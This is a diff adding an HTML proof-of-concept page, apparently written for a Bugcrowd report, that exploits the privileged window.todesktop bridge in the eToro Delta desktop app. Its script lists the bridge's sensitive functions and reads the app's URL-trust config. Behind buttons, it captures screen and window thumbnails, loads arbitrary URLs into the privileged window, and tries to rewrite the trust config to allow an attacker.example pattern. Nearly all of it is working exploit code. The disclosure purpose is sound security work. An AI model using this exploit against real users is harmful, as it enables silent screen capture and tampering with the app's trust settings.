@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>eToro Delta Desktop — Privileged window.todesktop Bridge PoC</title>
+<style>
+  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#e6edf3;--muted:#8b949e;--red:#f85149;--green:#3fb950;--amber:#e3b341;--blue:#58a6ff}
+  *{box-sizing:border-box}
+  body{font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);margin:0;padding:24px}
+  .wrap{max-width:940px;margin:0 auto}
+  h1{font-size:18px;margin:0 0 4px}
+  h2{font-size:14px;margin:24px 0 8px;color:var(--blue);font-weight:600}
+  .sub{color:var(--muted);font-size:13px;margin-bottom:16px}
+  code{background:#21262d;padding:1px 5px;border-radius:4px;font-size:12px}
+  .box{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px 16px;margin:10px 0;white-space:pre-wrap;word-break:break-all;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12.5px}
+  .ok{color:var(--green);font-weight:600}.no{color:var(--red);font-weight:600}.warn{color:var(--amber)}
+  button{background:#238636;color:#fff;border:0;border-radius:6px;padding:8px 14px;cursor:pointer;font-size:13px;margin:4px 8px 4px 0}
+  button.alt{background:#21262d;border:1px solid var(--border);color:var(--text)}
+  button:disabled{opacity:.45;cursor:not-allowed}
+  .cap{border-left:3px solid var(--red);padding-left:12px;margin:14px 0 6px}
+  .cap b{color:var(--red)}
+  .tag{display:inline-block;background:#21262d;border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-size:11px;color:var(--muted);margin-left:6px}
+  img.shot{max-width:220px;border:1px solid var(--border);border-radius:6px;margin:6px 8px 0 0;vertical-align:top}
+  .banner{border:1px solid var(--amber);border-radius:8px;padding:12px 14px;color:var(--amber);margin:12px 0;font-size:13px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>eToro Delta Desktop — Privileged <code>window.todesktop</code> Bridge PoC</h1>
+  <div class="sub">Security proof-of-concept for Bugcrowd. This page is <b>attacker-controlled content</b>. When it is rendered inside the eToro Delta native application window it obtains the privileged <code>window.todesktop</code> bridge. In a normal browser the bridge is absent — open this page inside the app to demonstrate the issue.</div>
+
+  <div id="banner"></div>
+  <div class="box" id="env">Detecting…</div>
+
+  <h2>Privileged API surface reachable from this page</h2>
+  <div class="box" id="tree">Enumerating window.todesktop…</div>
+
+  <h2>Demonstrated attacker capabilities</h2>
+
+  <div class="cap"><b>1 · Read the app's internalUrls trust config</b> — <code>window.todesktop.app.getInternalUrls()</code></div>
+  <div class="box" id="cfg">(runs automatically)</div>
+
+  <div class="cap"><b>2 · Silent screen / window capture</b> — <code>window.todesktop.desktopCapturer.getSources()</code><span class="tag">captures what is on screen when clicked</span></div>
+  <button id="btnShot" onclick="captureScreen()">Capture screen &amp; windows</button>
+  <div class="box" id="shot">Not run.</div>
+
+  <div class="cap"><b>3 · Load an arbitrary URL into the privileged app window</b> — <code>window.todesktop.contents.openUrlInApp()</code> <span class="tag">no origin check</span></div>
+  <button id="btnChain" onclick="chainUrl()">Load arbitrary URL in-app</button>
+  <div class="box" id="chain">Not run.</div>
+
+  <div class="cap"><b>4 · Rewrite the internalUrls trust config</b> — <code>window.todesktop.app.updateInternalUrls()</code> <span class="warn">(gated by Qrr; succeeds when this page's URL contains <code>delta.app/</code>)</span></div>
+  <button id="btnWrite" class="alt" onclick="writeCfg()">Write internalUrls (test value)</button>
+  <div class="box" id="write">Not run.</div>
+
+</div>
+<script>
+const td = typeof window.todesktop !== "undefined" ? window.todesktop : null;
+const ok = v => v ? '<span class="ok">PRESENT</span>' : '<span class="no">absent</span>';
+
+if(!td){
+  document.getElementById("banner").innerHTML =
+    '<div class="banner"><b>window.todesktop is absent.</b> This page is running in a normal browser, not inside the eToro Delta app. ' +
+    'To demonstrate the vulnerability, load this page into the Delta application window (see the report\'s Steps to Reproduce), then it will show PRESENT and the capabilities below become usable.</div>';
+  ["btnShot","btnChain","btnWrite"].forEach(id=>document.getElementById(id).disabled=true);
+}
+
+document.getElementById("env").innerHTML =
+  "location.href     = " + location.href + "\n" +
+  "origin            = " + location.origin + "   (attacker-controlled, NOT delta.app)\n" +
+  "window.todesktop  = " + ok(td) + "\n" +
+  "bridge in main world = " + (td ? "yes (contextBridge)" : "n/a");
+
+const SENS = /openUrlInApp|openUrlInBrowser|getInternalUrls|updateInternalUrls|getSources|MediaAccess|executeJavaScript|loadURL|openExternal|createNewWindow|createNewTab|register|invoke|setWindowOpenRules/i;
+let tree = [];
+function walk(o,p,d){ if(d>4||o==null) return; let ks; try{ks=Object.keys(o)}catch(e){return} for(const k of ks){ let v; try{v=o[k]}catch(e){continue} const fp=p+"."+k; const t=typeof v; const s=SENS.test(fp)?' <span class="no">[sensitive]</span>':""; tree.push(fp+" : "+t+(t==="function"?"()":"")+s); if(t==="object"&&v) walk(v,fp,d+1);} }
+if(td) walk(td,"window.todesktop",1);
+document.getElementById("tree").innerHTML = tree.length ? tree.join("\n") : "(empty / not enumerable)";
+
+function findPath(sub){ for(const l of tree){ if(l.indexOf(sub)>=0 && l.indexOf("()")>=0) return l.split(" : ")[0]; } return null; }
+function byPath(p){ return p.replace(/^window\.todesktop\.?/,"").split(".").filter(Boolean).reduce((o,k)=>o?o[k]:o, td); }
+
+(async function(){
+  const el=document.getElementById("cfg"); const p=findPath("getInternalUrls");
+  if(!p){ el.textContent="getInternalUrls not found"; return; }
+  try{ const r=await byPath(p)(); el.innerHTML='<span class="ok">SUCCESS</span> — '+p+'() returned:\n'+JSON.stringify(r)+'\n\n=> attacker content reads the app\'s URL-trust configuration'; }
+  catch(e){ el.textContent="error: "+e; }
+})();
+
+async function captureScreen(){
+  const el=document.getElementById("shot"); const p=findPath("getSources");
+  if(!p){ el.textContent="desktopCapturer.getSources not found"; return; }
+  el.textContent="Capturing…";
+  try{
+    const srcs=await byPath(p)({types:["screen","window"]});
+    let html='<span class="ok">SUCCESS</span> — '+p+'() returned '+srcs.length+' source(s). Live screen/window thumbnails are handed to attacker content:\n\n';
+    srcs.slice(0,8).forEach(s=>{ html+="• "+(s.name||"(unnamed)")+"  ["+(s.type||"?")+"]  id="+(s.id||"?")+"\n"; });
+    html+="\n";
+    srcs.slice(0,3).forEach(s=>{ if(s.thumbnail) html+='<img class="shot" src="'+s.thumbnail+'">'; });
+    el.innerHTML=html+'\n=> silent screen / window capture from untrusted web content';
+  }catch(e){ el.textContent="error: "+e; }
+}
+
+function chainUrl(){
+  const el=document.getElementById("chain"); const p=findPath("openUrlInApp");
+  if(!p){ el.textContent="openUrlInApp not found"; return; }
+  try{ byPath(p)(location.href.split("#")[0]+"?chained=1"); el.innerHTML='<span class="ok">CALLED</span> — '+p+'(arbitrary URL): the privileged app window is navigated to attacker-controlled content with no origin validation.'; }
+  catch(e){ el.textContent="error: "+e; }
+}
+
+async function writeCfg(){
+  const el=document.getElementById("write"); const p=findPath("updateInternalUrls");
+  if(!p){ el.textContent="updateInternalUrls not found"; return; }
+  try{
+    const test="^https?:\\/\\/(.*)?attacker\\.example\\/.*";
+    const r=await byPath(p)(test);
+    el.innerHTML='<span class="ok">RETURNED</span> '+JSON.stringify(r)+' — '+p+'("'+test+'")\n\n(if true: attacker content rewrote the app\'s internalUrls trust config; confirm by re-reading getInternalUrls).';
+  }catch(e){ el.textContent="error: "+e; }
+}
+</script>
+</body>
+</html>
